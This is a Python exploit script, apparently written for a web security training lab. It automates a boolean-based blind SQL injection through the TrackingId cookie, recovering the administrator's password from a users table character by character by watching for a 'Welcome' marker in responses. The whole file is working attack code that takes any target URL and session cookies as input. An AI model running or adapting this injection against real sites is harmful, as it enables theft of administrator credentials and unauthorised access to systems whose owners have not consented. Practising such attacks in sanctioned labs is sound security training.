#! /usr/bin/python3

from pwn import *
import requests, time

url = input("URL https://").rstrip()
tracking = input("Tracking cookie: ").rstrip()
session = input("Session cookie: ").rstrip()
print()

alphanum = ["0123456789", "abcdefgh", "ijklmnop", "qrstuvwxyz"]

p1 = log.progress("Bruteforce")
p2 = log.progress("Passwd")
p3 = log.progress("Time elapsed")

passwd = ""
beg = time.time()

def request(i, inj):
    cookies = {
            "TrackingId": tracking +  "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), " + str(i) + ", 1) " + inj,
            "session": session
            }

    p1.status(inj[-1])
    req = requests.get("https://" + url, cookies=cookies)

    return req.text

def getPasswd(chars, n):
    global passwd
    p3.status(round(time.time() - beg, 2))

    if n == len(passwd):
        return

    if "Welcome" in request(n, "> '" + chars[0][-1]):
        getPasswd(chars[1:], n)

    else:
        for c in chars[0]:
            if "Welcome" in request(n, "= '" + c):
                passwd += c
                p2.status(passwd)
                return

for i in range(1, 21):
    getPasswd(alphanum, i)
